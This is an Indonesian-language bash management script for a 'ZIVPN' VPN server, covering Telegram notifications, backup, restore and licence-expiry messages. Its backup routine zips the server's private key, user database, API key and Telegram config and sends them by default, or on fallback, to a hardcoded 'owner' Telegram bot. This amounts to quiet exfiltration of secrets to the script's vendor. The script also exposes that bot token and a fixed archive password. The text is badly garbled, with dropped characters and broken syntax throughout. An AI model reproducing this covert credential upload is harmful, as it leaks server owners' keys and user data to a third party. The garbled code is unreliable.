CONFIG_DIR=/etc/zivpn
TELEGRAM_CONF={CONFIG_DIR}/telegram.conf
function get_host() {
  local CERT_CN
  CERT_CN=$(openssl x509 -in ${CONFIG_DIR}/zivpn.crt -noout -subject | sed -n /.*CN = \([^,]*\).*/\1/p
  if [ ERT_CN== zivpn; then
    curl -4 -s ifconfig.me
    else
    echo ERT_CN
  fi
}
function send_telegram_notification() {
  local message=1
  local keyboard=$2
  if [ ! -f TELEGRAM_CONF; then
    return 1
  fi
  source $TELEGRAM_CONF
  if [ -n LEGRAM_BOT_TOKEN&& [ -n LEGRAM_CHAT_ID]; then
    local api_url=ttps://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage
    if [ -n yboard]; then
      curl -s -X POST i_urld hat_id=${TELEGRAM_CHAT_ID}--data-urlencode xt=${message}d eply_markup=${keyboard} > /dev/null
      else
      curl -s -X POST i_urld hat_id=${TELEGRAM_CHAT_ID}--data-urlencode xt=${message}d arse_mode=Markdown> /dev/null
    fi
  fi
}
function setup_telegram() {
  echo - Konfigurasi Notifikasi Telegram ---
  read -p ukkan Bot API Key Anda: i_key
  read -p ukkan ID Chat Telegram Anda (dapatkan dari @userinfobot): chat_id
  if [ -z i_key || [ -z hat_id]; then
    echo I Key dan ID Chat tidak boleh kosong. Pengaturan dibatalkan.
    return 1
  fi
  echo LEGRAM_BOT_TOKEN=${api_key} > $TELEGRAM_CONF
  echo LEGRAM_CHAT_ID=${chat_id}> TELEGRAM_CONF
  chmod 600 TELEGRAM_CONF
  echo nfigurasi berhasil disimpan di $TELEGRAM_CONF
  return 0
}
function handle_backup() {
  echo - Memulai Proses Backup ---
  if [ -f LEGRAM_CONF ]; then
    source $TELEGRAM_CONF
  fi
  DEFAULT_BOT_TOKEN=706681818:AAHXddmh4zc8m4kSk49UZCHScRcOxRZ0N0Q
  DEFAULT_CHAT_ID=2241851
  BOT_TOKEN={TELEGRAM_BOT_TOKEN:-$DEFAULT_BOT_TOKEN}
  CHAT_ID=ELEGRAM_CHAT_ID:-$DEFAULT_CHAT_ID}
  if [ -z T_TOKEN ] || [ -z $CHAT_ID then
    echo Telegram Bot Token / Chat ID belum diset! tee -a /var/log/zivpn_backup.log
    read -p an [Enter]...& /usr/local/bin/zivpn-manager
    return
  fi
  VPS_IP=$(curl -4 -s ifconfig.me || curl -6 -s ifconfig.me)
  TIMESTAMP=$(date +%Y%m%d-%H%M%S)
  backup_filename=pn_backup_${VPS_IP}_${TIMESTAMP}.zip
  temp_backup_path=mp/${backup_filename}
files_to_backup=(
NFIG_DIR/config.json
NFIG_DIR/users.db
NFIG_DIR/api_auth.key
NFIG_DIR/telegram.conf
NFIG_DIR/total_users.txt
NFIG_DIR/zivpn.crt
NFIG_DIR/zivpn.key
)
echo mbuat backup ZIP...
valid_files=()
for f in files_to_backup[@]}; do
  [ -f && valid_files+=(
done
if [ ${#valid_files[@]} -eq 0 ]; then
  echo Tidak ada file valid untuk dibackup!tee -a /var/log/zivpn_backup.log
  read -p an [Enter]...& /usr/local/bin/zivpn-manager
  return
fi
zip -j -P riZiVPN-Gacorr123!mp_backup_pathalid_files[@]}>/dev/null 2>&1
if [ ! -f temp_backup_path then
  echo Gagal membuat file backup!| tee -a /var/log/zivpn_backup.log
  read -p an [Enter]...& /usr/local/bin/zivpn-manager
  return
fi
echo ngirim backup ke Telegram (User Bot)...
caption=BACKUP ZIVPN SELESAI ⚠️
IP VPS   : ${VPS_IP}
Tanggal  : $(date +%d %B %Y %H:%M:%S
File     : ${backup_filename}
send_result=$(curl -s -X POST ttps://api.telegram.org/bot${BOT_TOKEN}/sendDocument
-F chat_id=${CHAT_ID}\
-F document=@temp_backup_path}
-F caption=$caption
SEND_BY=R_BOT
if ! echo send_result | grep -q :truethen
  echo  Gagal kirim ke User Bot, fallback ke Owner Bot...| tee -a /var/log/zivpn_backup.log
  send_result=$(curl -s -X POST ttps://api.telegram.org/bot${DEFAULT_BOT_TOKEN}/sendDocument
  -F chat_id=${DEFAULT_CHAT_ID}\
  -F document=@temp_backup_path}
  -F caption=$caption
  SEND_BY=ER_BOT
  if ! echo send_result | grep -q :truethen
    echo GAGAL TOTAL kirim ke Telegram!| tee -a /var/log/zivpn_backup.log
    echo sponse: $send_result /var/log/zivpn_backup.log
    rm -f temp_backup_path
    read -p an [Enter]...& /usr/local/bin/zivpn-manager
    return
  fi
fi
FILE_ID=$(echo $send_resultjq -r result.document.file_id)
if [ END_BY= WNER_BOT then
  ACTIVE_BOT_TOKEN=EFAULT_BOT_TOKEN
  ACTIVE_CHAT_ID=$DEFAULT_CHAT_ID
  else
  ACTIVE_BOT_TOKEN=OT_TOKEN
  ACTIVE_CHAT_ID=$CHAT_ID
fi
curl -s -X POST ps://api.telegram.org/bot${ACTIVE_BOT_TOKEN}/sendMessage
-d chat_id=${ACTIVE_CHAT_ID}
-d parse_mode=TML \
-d text=b>Backup ZIVPN BERHASIL</b>
<b>Nama File:</b>
<code>${backup_filename}</code>
<b>�� CARA RESTORE BACKUP</b>
<b>1) Via FILE ID</b>
<code>${FILE_ID}</code>
<b>2) Via LINK FILE (HTTPS)</b>
https://t.me/potato_directlinkBot
<b>Dikirim via:</b> ${SEND_BY}
echo  Backup sukses | File ID: ${FILE_ID}tee -a /var/log/zivpn_backup.log
rm -f temp_backup_path
clear
echo  Backup ZIVPN VPS ${VPS_IP} Selesai ⚠️
echo nggal  : $(date + %B %Y %H:%M:%S)
echo le     : ${backup_filename}
echo le ID  : ${FILE_ID}
echo
echo ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo  CARA RESTORE BACKUP
echo ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo  Restore via FILE ID (Telegram Bot)
echo  - Masukkan File ID berikut:
echo    ${FILE_ID}
echo
echo  Restore via LINK FILE (HTTPS)
echo  - Kirim file backup ke:
echo    https://t.me/potato_directlinkBot
echo  - Salin link HTTPS lalu paste saat restore
echo
read -p an [Enter] untuk kembali ke menu... && /usr/local/bin/zivpn-manager
}
function handle_expiry_notification() {
local host=$1
local ip=
local client=
local isp=4
local exp_date=$5
local message
message=$(cat <<EOF
◇━━━━━━━━━━━━━━◇
⛔SC ZIVPN EXPIRED ⛔
◇━━━━━━━━━━━━━━◇
IP VPS  : ${ip}
HOST  : ${host}
ISP     : ${isp}
CLIENT : ${client}
EXP DATE  : ${exp_date}
◇━━━━━━━━━━━━━━◇
EOF
)
local keyboard
keyboard=$(cat <<EOF
{
  ine_keyboard
  [
  {
    tpanjang Licence,
    https://t.me/ARI_VPN_STORE
  }
  ]
  ]
}
EOF
)
send_telegram_notification $messagekeyboard
}
function handle_renewed_notification() {
local host=$1
local ip=
local client=
local isp=4
local expiry_timestamp=$5
local current_timestamp
current_timestamp=$(date +%s)
local remaining_seconds=$((expiry_timestamp - current_timestamp))
local remaining_days=$((remaining_seconds / 86400))
local message
message=$(cat <<EOF
◇━━━━━━━━━━━━━━◇
✅RENEW SC ZIVPN✅
◇━━━━━━━━━━━━━━◇
IP VPS  : ${ip}
HOST  : ${host}
ISP     : ${isp}
CLIENT : ${client}
EXP : ${remaining_days} Days
◇━━━━━━━━━━━━━━◇
EOF
)
send_telegram_notification $message
}
function handle_api_key_notification() {
local api_key=1
local server_ip=
local domain=
local message
message=$(cat <<EOF
🚀 API UDP ZIVPN 🚀
🔑 Auth Key: ${api_key}
🌐 Server IP: ${server_ip}
🌍 Domain: ${domain}
EOF
)
send_telegram_notification $message
}
function handle_restore() {
echo - Starting Restore Process ---
if [ -f LEGRAM_CONF ]; then
  source $TELEGRAM_CONF
fi
DEFAULT_BOT_TOKEN=706681818:AAHXddmh4zc8m4kSk49UZCHScRcOxRZ0N0Q
DEFAULT_CHAT_ID=2241851
BOT_TOKEN={TELEGRAM_BOT_TOKEN:-$DEFAULT_BOT_TOKEN}
CHAT_ID=ELEGRAM_CHAT_ID:-$DEFAULT_CHAT_ID}
echo
echo lih metode restore:
echo  Restore via FILE_ID Telegram
echo  Restore via DIRECT LINK (.zip)
echo
read -p ih [1/2]: RESTORE_MODE
temp_restore_path=tmp/zivpn_restore_$(date +%s).zip
case ESTORE_MODE in
1)
read -p ukkan FILE_ID Telegram : ILE_ID
[ -z ILE_ID] && echo  FILE_ID kosong! sleep 2 && return
echo ngambil file dari Telegram (User Bot)...
FILE_PATH=$(curl -s ps://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${FILE_ID}jq -r result.file_path
SEND_BY=R_BOT
if [ -z LE_PATH ] || [ LE_PATH = null then
  echo  Gagal ambil file via User Bot, fallback ke Owner Bot...
  FILE_PATH=$(curl -s ps://api.telegram.org/bot${DEFAULT_BOT_TOKEN}/getFile?file_id=${FILE_ID}jq -r result.file_path
  SEND_BY=ER_BOT
  if [ -z LE_PATH ] || [ LE_PATH = null then
    echo FILE_ID tidak valid di kedua bot!
    read -p an [Enter]...& /usr/local/bin/zivpn-manager
    return
  fi
fi
curl -s -o $temp_restore_pathps://api.telegram.org/file/bot${BOT_TOKEN}/${FILE_PATH}
[ SEND_BY = OWNER_BOT && curl -s -o $temp_restore_pathps://api.telegram.org/file/bot${DEFAULT_BOT_TOKEN}/${FILE_PATH}
;;
2)
read -p ukkan DIRECT LINK file backup (.zip): DIRECT_URL
if [[ -z IRECT_URL| DIRECT_URL!= http* ]]; then
  echo URL tidak valid!
  read -p an [Enter]...& /usr/local/bin/zivpn-manager
  return
fi
echo ngunduh file dari link...
curl -L -s -o temp_restore_path$DIRECT_URL
;;
*)
echo Pilihan tidak valid!
sleep 2
return
;;
esac
if [ ! -f temp_restore_path; then
  echo File restore tidak ditemukan!
  read -p an [Enter]...& /usr/local/bin/zivpn-manager
  return
fi
read -p DATA AKAN DITIMPA! Lanjutkan restore? (y/n): onfirm
[ confirm != ] && echo estore dibatalkan.&& sleep 2 && return
echo tracting & restoring data...
unzip -P iZiVPN-Gacorr123!o temp_restore_pathd CONFIG_DIR>/dev/null 2>&1
if [ $? -ne 0 ]; then
  echo Gagal extract backup!
  rm -f temp_restore_path
  read -p an [Enter]...& /usr/local/bin/zivpn-manager
  return
fi
rm -f temp_restore_path
echo starting ZIVPN service...
systemctl restart zivpn.service
echo Restore BERHASIL! (via $SEND_BY)
read -p an [Enter] untuk kembali ke menu... && /usr/local/bin/zivpn-manager
}
case
backup)
handle_backup
;;
restore)
handle_restore
;;
setup-telegram)
setup_telegram
;;
expiry-notification)
if [ $# -ne 6 ]; then
echo age: $0 expiry-notification <host> <ip> <client> <isp> <exp_date>
exit 1
fi
handle_expiry_notification $2 5$6
;;
renewed-notification)
if [ $# -ne 6 ]; then
echo age: $0 renewed-notification <host> <ip> <client> <isp> <expiry_timestamp>
exit 1
fi
handle_renewed_notification  4$5
;;
api-key-notification)
if [ $# -ne 4 ]; then
echo age: $0 api-key-notification <api_key> <server_ip> <domain>
exit 1
fi
handle_api_key_notification  4
;;
*)
echo age: $0 {backup|restore|setup-telegram|expiry-notification|renewed-notification|api-key-notification}
exit 1
;;
esac